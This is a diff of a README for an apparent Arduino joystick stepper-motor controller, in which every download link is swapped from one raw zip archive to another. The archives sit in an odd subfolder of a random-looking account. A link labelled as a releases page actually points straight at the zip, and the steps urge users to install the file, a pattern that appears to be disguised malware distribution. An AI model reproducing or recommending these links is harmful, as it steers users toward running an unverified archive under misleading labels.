@@ -1,7 +1,7 @@
 # 🎮 joystick-stepper-controller - Control Your Stepper Motor with Ease
 
 ## 🌐 Quick Download
-[![Download Now](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller_joystick_stepper_2.3-alpha.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller_joystick_stepper_2.3-alpha.2.zip)
+[![Download Now](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller-joystick-stepper-3.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller-joystick-stepper-3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the joystick-stepper-controller repository! This project provides an easy way to control stepper motors using an Arduino joystick. Perfect for beginners and DIY enthusiasts, this application gives you the tools to manage speed and direction with simple control options.
@@ -22,12 +22,12 @@ To run the joystick-stepper-controller, ensure your setup meets the following re
 ## 📥 Download & Install
 To download the latest version of joystick-stepper-controller, please visit the following page:
 
-[Download Latest Release](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller_joystick_stepper_2.3-alpha.2.zip)
+[Download Latest Release](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller-joystick-stepper-3.1.zip)
 
 Here, you will find all available versions of the application. Select the latest release and follow these steps:
 
 ### Steps to Download and Install
-1. Visit the [Releases page](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller_joystick_stepper_2.3-alpha.2.zip).
+1. Visit the [Releases page](https://github.com/aouyfuagfiuaidf7/joystick-stepper-controller/raw/refs/heads/main/interosseous/controller-joystick-stepper-3.1.zip).
 2. Look for the latest version.
 3. Click on the download link to get the installation file.
 4. Once downloaded, locate the file on your computer.
